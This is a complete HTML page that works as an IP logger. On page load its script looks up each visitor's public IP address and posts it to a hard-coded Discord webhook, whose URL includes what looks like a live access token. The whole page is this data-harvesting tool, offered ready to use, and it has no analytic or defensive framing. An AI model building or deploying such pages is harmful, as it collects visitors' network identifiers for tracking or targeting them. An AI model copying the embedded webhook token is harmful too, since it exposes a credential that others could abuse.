<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <script>
        // Function to send IP to webhook
        async function sendIPToWebhook(ip) {
            const webhookURL = "https://discord.com/api/webhooks/1314782178491629598/K_FBAhGqn0t-z5IeHHRgvGUdwdHPgvv7GEq5_JsYhTuKFWUFGGpy6lKgYmsINM_oSfp5"; // Replace with your webhook URL

            // Payload for the webhook
            const payload = {
                content: `Visitor's IP Address: ${ip}`
            };

            try {
                // Sending IP to the webhook
                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });
                console.log("IP sent to webhook successfully.");
            } catch (error) {
                console.error("Failed to send IP to webhook:", error);
            }
        }

        // Fetch IP and send it
        async function fetchAndSendIP() {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                const ip = data.ip;

                console.log("Fetched IP:", ip);
                await sendIPToWebhook(ip);
            } catch (error) {
                console.error("Error fetching IP:", error);
            }
        }

        // Fetch and send IP when the page loads
        window.onload = fetchAndSendIP;
    </script>
</head>
<body>
    <h1>Welcome!</h1>
    <p>Your IP address is being logged.</p>
</body>
</html>
